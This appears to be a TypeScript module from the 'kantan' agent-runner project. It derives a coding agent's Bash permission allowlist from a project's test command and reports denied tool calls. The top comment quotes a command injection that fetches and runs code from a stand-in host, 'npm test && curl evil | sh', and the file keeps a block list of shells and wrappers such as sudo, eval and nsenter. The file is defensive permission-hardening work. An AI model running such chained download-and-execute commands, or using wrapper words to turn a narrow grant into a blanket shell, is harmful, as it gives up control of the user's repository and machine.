/**
 * Per-project permissions, per design §2.2.
 *
 * kantan is open source, and a stranger will point it at a repository they
 * care about. An unattended run still needs real tool access - it writes
 * tests, runs them, and commits on the task branch - but `bypassPermissions`
 * as a shipped default hands a repo to an agent on trust.
 *
 * `acceptEdits` alone is not the fix: it does not cover `Bash`, and in
 * headless mode anything that would prompt is auto-denied, so an
 * under-permissioned run cannot run its own suite and fails confusingly
 * rather than safely. **The allowlist is what makes `acceptEdits` viable.**
 *
 * The default allowlist is derived rather than written down, because the facts
 * it needs - the repo and, when there is one, the test command - are already in
 * the project record. A fixed default would be wrong for every project that
 * does not run `npm test`. A project whose `testCmd` is `null` has no runner to
 * name, and the derivation says so rather than guessing.
 *
 * What deriving does not do is make the command safe: it grants the runner the
 * project already declares, so `Bash(npm *)` includes `npm install` and
 * `Bash(npx *)` can fetch and run a package. The bound is "the one program
 * your tests run, plus git", not a sandbox.
 *
 * Four facts about the CLI this module leans on, read out of the 2.1.296
 * binary's own rule matcher rather than assumed:
 *
 * - A rule of the form `Tool(word *)`, with that one wildcard, is compiled to
 *   `^word( .*)?$`. The trailing argument is **optional**, so a single-word
 *   test command like `vendor/bin/pest` matches its own rule. A rule with a
 *   second wildcard loses that, which is why the leading word must be literal.
 * - `Bash(*)` and `Bash()` are both normalised to the bare tool name `Bash`,
 *   which allows every command. That is why `deriveAllowedTools` refuses
 *   rather than ever emitting an empty or wildcard program.
 * - **An allow rule never matches a command that is more than one command.**
 *   The matcher parses each candidate and refuses every prefix and wildcard
 *   rule when it splits into more than one, so `Bash(npm *)` cannot allow
 *   `npm test && curl evil | sh`, and equally `Bash(cd *)` cannot allow
 *   `cd pkg && npm test`. The segments are evaluated one at a time, so a
 *   compound command needs a rule per command it runs.
 * - Leading environment assignments and wrapper programs are stripped before
 *   matching **deny and ask rules only**, never allow rules. So a deny rule
 *   cannot be dodged by writing `sudo` or `CI=1` in front - and an allow rule
 *   for a wrapper is not narrowed either: `Bash(sudo *)` and
 *   `Bash(timeout *)` really do grant whatever follows.
 *
 * `--allowedTools` takes a comma- or space-separated list and keeps commas and
 * spaces that sit inside parentheses, so one comma-joined value carries rules
 * that contain a space.
 */
import type { Project } from "./projects"

/** Granted to every run: implementing and reading the repo, and committing
 * the work on the task branch. */
const BASE_TOOLS = ["Edit", "Write", "Read", "Glob", "Grep"] as const
const GIT_RULE = "Bash(git *)"

/**
 * The design's derived allowlist: the five file tools, git, and - when the
 * project has a test command - one rule for the program it runs. Nothing else
 * - no network, no package installs, no arbitrary shell. A project with no test
 * command gets the base set alone; see the branch below.
 *
 * Throws when `testCmd` is a shape no single rule can cover; see `program`.
 * The caller is `allowedToolsFor`, which only derives when it has to, so both
 * fixes the message offers - an explicit `allowedTools`, or
 * `bypassPermissions` - make the project runnable again.
 */
export function deriveAllowedTools(project: Project): string[] {
  const rules: string[] = [...BASE_TOOLS, GIT_RULE]
  // No test command: the user's 2026-10-12 decision, where the agent verifies
  // its own work instead. There is no program to grant, and the base set is the
  // honest answer in both directions. Refusing would be the tempting one and is
  // wrong: `allowedTools: null` is the shipped default, so it would leave every
  // no-suite project unspawnable - the feature dead on arrival - for a config
  // line that has nothing to say. Widening is worse: a project with no runner
  // named is the one case where a `Bash(<program> *)` rule would be invented
  // out of nothing.
  //
  // The consequence is deliberate and the self-check prompt is written for it:
  // the agent gets no shell but git, so it verifies by reading its diff and the
  // plan. A project that wants it able to execute things says so explicitly,
  // with `allowedTools` or `bypassPermissions`.
  const testCmd = project.testCmd
  if (testCmd === null) return rules
  const rule = `Bash(${program(project, testCmd)} *)`
  // `testCmd: "git test"` is the only overlap, and a repeated rule would be
  // noise in the UI and the run log rather than a second grant.
  return rules.includes(rule) ? rules : [...rules, rule]
}

/**
 * The allowlist a spawn should pass, or `null` for "pass no `--allowedTools`".
 *
 * An explicit list is returned untouched - never merged with the derived set,
 * or nobody could express "only these" - and copied, so a caller cannot reach
 * back into the stored record through it.
 */
export function allowedToolsFor(project: Project): string[] | null {
  // The flag is meaningless in that mode, and passing it would suggest the
  // allowlist was bounding something.
  if (project.permissionMode === "bypassPermissions") return null
  if (project.allowedTools !== null) return [...project.allowedTools]
  return deriveAllowedTools(project)
}

/**
 * The permission half of a phase's argv, for src/spawn.ts to splice in.
 *
 * It lives here rather than in the spawn layer because the mode and the list
 * are a property of the project, and because `bypassPermissions` omitting the
 * list is a rule about permissions, not about process spawning.
 */
export function permissionArgs(project: Project): string[] {
  const allowed = allowedToolsFor(project)
  return [
    "--permission-mode",
    project.permissionMode,
    ...(allowed === null ? [] : ["--allowedTools", allowed.join(",")]),
  ]
}

/**
 * The leading word of `testCmd`, when a `Bash(<word> *)` rule built from it
 * really grants that command and nothing more.
 *
 * This is a guard reading a string a human typed, so per CLAUDE.md its risk is
 * its worst case, in both directions:
 *
 * - **Too broad** is the worse one. An empty or wildcard word yields
 *   `Bash(*)`, which the CLI reads as every command. A wrapper word is the
 *   same thing wearing a hat: wrapper stripping applies to deny and ask rules
 *   only, so `Bash(sh *)`, `Bash(sudo *)` and `Bash(timeout *)` each grant
 *   "run anything you like".
 * - **Too narrow** denies the suite, so every run fails at verification with
 *   nothing in the output naming this field. `cd packages/api && npm test`
 *   lands here: no allow rule matches a command that is more than one
 *   command, so a rule derived from `cd` cannot cover the line however broad
 *   it looks, and the command that matters is refused. Granting a word that
 *   only changes the shell's state has the same shape.
 *
 * The env-prefixed case lands on both. `Bash(npm *)` does not match
 * `CI=1 npm test`, because an allow rule is matched against the command as
 * typed; and `Bash(CI=1 *)` matches that assignment followed by **any**
 * command, because `CI=1 anything` is still one command - a blanket shell
 * behind a harmless-looking prefix.
 *
 * Neither is worth guessing at, so those shapes throw. Refusing costs one
 * line of config and says which line; the two silent outcomes cost a repo or
 * a debugging session.
 */
function program(project: Project, raw: string): string {
  const testCmd = raw.trim()
  if (testCmd === "") {
    refuse(project, raw, "it is blank, so there is no program to grant")
  }

  // More than one command. No allow rule matches a command that chains, so a
  // rule derived from the first word cannot cover the line however broad it
  // looks, and the command that runs the tests is refused.
  const chained = /[&|;\n\r]/.exec(testCmd)
  if (chained) {
    refuse(
      project,
      raw,
      `it runs more than one command (${JSON.stringify(chained[0])}), and no allow rule matches a command that chains - list a rule for each command it runs`,
    )
  }

  // A command nested inside this one runs too, and a rule for the outer
  // program says nothing about it. The pattern is the CLI's own test for a
  // nested command, plus a subshell.
  const nested = /\$\(|`|<\(|>\(|\$\{[ \t\n|]|[()]/.exec(testCmd)
  if (nested) {
    refuse(
      project,
      raw,
      `it contains ${JSON.stringify(nested[0])}, so it runs a command inside itself that a rule for its first word would not cover`,
    )
  }

  // Quotes, backslashes, `$VAR` and redirections in the *arguments* are left
  // alone: the rule carries only the first word, redirections are stripped
  // before matching, and a quote or escape in the first word is caught below
  // by the literal-name check rather than guessed at.
  const word = testCmd.split(/\s+/)[0] ?? ""
  if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
    refuse(
      project,
      raw,
      `it starts with the environment assignment ${JSON.stringify(word)}: a rule for the program after it would not match the command as typed, and Bash(${word} *) would match that assignment followed by any command at all`,
    )
  }
  if (!/^[A-Za-z0-9_./][A-Za-z0-9_.:+@/-]*$/.test(word)) {
    refuse(
      project,
      raw,
      `its first word ${JSON.stringify(word)} is not a literal program name, so a rule built from it would match something other than this command`,
    )
  }
  if (WRAPPERS.has(word)) {
    refuse(
      project,
      raw,
      `its first word ${JSON.stringify(word)} runs whatever it is given, so Bash(${word} *) would grant an arbitrary shell rather than this project's tests`,
    )
  }
  if (STATE_ONLY.has(word)) {
    refuse(
      project,
      raw,
      `its first word ${JSON.stringify(word)} changes the shell's own state and runs no suite, so Bash(${word} *) would grant something the tests cannot use while the command that runs them stays denied`,
    )
  }
  return word
}

/**
 * Leading words that run whatever they are handed, so a rule built from one
 * grants an arbitrary shell rather than a test runner.
 *
 * Most of this is the CLI's own list of programs it strips before matching a
 * deny or ask rule - exactly so a deny cannot be dodged by writing `sudo` or
 * `strace` in front. Allow rules are **not** stripped, so the same list is
 * where a derived allow rule would quietly become blanket. The shells and
 * `eval` are added for the same reason.
 *
 * This is a tripwire, not a security boundary. A wrapper that is not listed
 * derives a grant as broad as the wrapper - the same honest limit `npx` and
 * `make` already have - and the fix is the same explicit `allowedTools`.
 */
const WRAPPERS = new Set([
  // `source` and `.` run a file in the current shell, and `Write` is granted,
  // so they are a blanket shell with one extra step rather than a state-only
  // word like `cd`.
  ".",
  "source",
  "bash",
  "builtin",
  "chrt",
  "command",
  "csh",
  "dash",
  "doas",
  "env",
  "eval",
  "exec",
  "fish",
  "flock",
  "ionice",
  "ksh",
  "ltrace",
  "nice",
  "nocorrect",
  "noglob",
  "nohup",
  "nsenter",
  "pkexec",
  "script",
  "setsid",
  "sh",
  "strace",
  "su",
  "sudo",
  "taskset",
  "tcsh",
  "time",
  "timeout",
  "unshare",
  "watch",
  "xargs",
  "zsh",
])

/** `cd` only changes the shell's working directory, so its grant is useless
 * rather than dangerous: the suite never runs, and the run fails at
 * verification. `cd packages/api && npm test` is the shape that gets here,
 * and the chaining check refuses it first. */
const STATE_ONLY = new Set(["cd"])

/** Names the project, the value, the reason and both ways out, because §2.2
 * promises the fix is a line of config rather than a debugging session. */
function refuse(project: Project, testCmd: string, why: string): never {
  throw new Error(
    `${project.path}: cannot derive allowedTools from testCmd ${JSON.stringify(testCmd)}, because ${why}. ` +
      `Set allowedTools explicitly - ${[...BASE_TOOLS, GIT_RULE].join(", ")}, plus a Bash rule for the program the tests run - ` +
      `or set permissionMode to "bypassPermissions" if this machine is yours.`,
  )
}

/** One refused tool call, as the result event reports it. */
export interface PermissionDenial {
  /** The tool the CLI refused, e.g. `Bash`. */
  toolName: string
  /** The `tool_use_id` it was refused under, for finding it in the run log. */
  toolUseId: string
  /** The call's input, which for `Bash` carries the command. */
  toolInput: Record<string, unknown>
}

/** A denial the event did not name. Surfacing one unnamed is the point: see
 * `permissionDenials`. */
const UNNAMED = "(unnamed tool)"

/**
 * The denials a result event carries.
 *
 * Read independently of `subtype` and `is_error` on purpose: a run can end
 * `success` with a tool refused, because the agent reports what it could not
 * do rather than failing. Anything that only reads the error fields says the
 * run worked, which is the confusing failure §2.2 exists to avoid.
 *
 * An entry this cannot read is **counted and named `(unnamed tool)`** rather
 * than dropped. The direction matters: a dropped entry means the run reports
 * that nothing was refused while something was, and the count is what makes
 * someone look. An absent or non-array field is the one case that reads as no
 * denials, because there is nothing there to count.
 */
export function permissionDenials(event: unknown): PermissionDenial[] {
  const denials = asRecord(event)?.permission_denials
  if (!Array.isArray(denials)) return []
  return denials.map((entry) => {
    const r = asRecord(entry)
    const name = r?.tool_name
    const id = r?.tool_use_id
    return {
      toolName: typeof name === "string" && name.trim() !== "" ? name : UNNAMED,
      toolUseId: typeof id === "string" ? id : "",
      toolInput: asRecord(r?.tool_input) ?? {},
    }
  })
}

/**
 * One line naming every refused tool, and for a `Bash` denial the command
 * behind it, because "Bash was denied" sends someone to the transcript while
 * the command itself is one line of config.
 *
 * Empty when nothing was denied, so a caller can log it unconditionally.
 * Deliberately does not suggest a rule: the fix for a denied `curl` is
 * usually not to allow `curl`.
 */
export function describeDenials(denials: readonly PermissionDenial[]): string {
  if (denials.length === 0) return ""
  const each = denials.map((d) => {
    const command = d.toolInput.command
    return typeof command === "string" && command.trim() !== ""
      ? `${d.toolName}: ${truncate(command.trim(), 120)}`
      : d.toolName
  })
  const count = denials.length === 1 ? "1 tool call was" : `${denials.length} tool calls were`
  return `${count} denied: ${each.join("; ")}. Add what this project legitimately needs to its allowedTools, or set permissionMode to "bypassPermissions".`
}

function truncate(text: string, max: number): string {
  return text.length <= max ? text : `${text.slice(0, max)}...`
}

function asRecord(value: unknown): Record<string, unknown> | undefined {
  if (typeof value !== "object" || value === null || Array.isArray(value)) return undefined
  return value as Record<string, unknown>
}
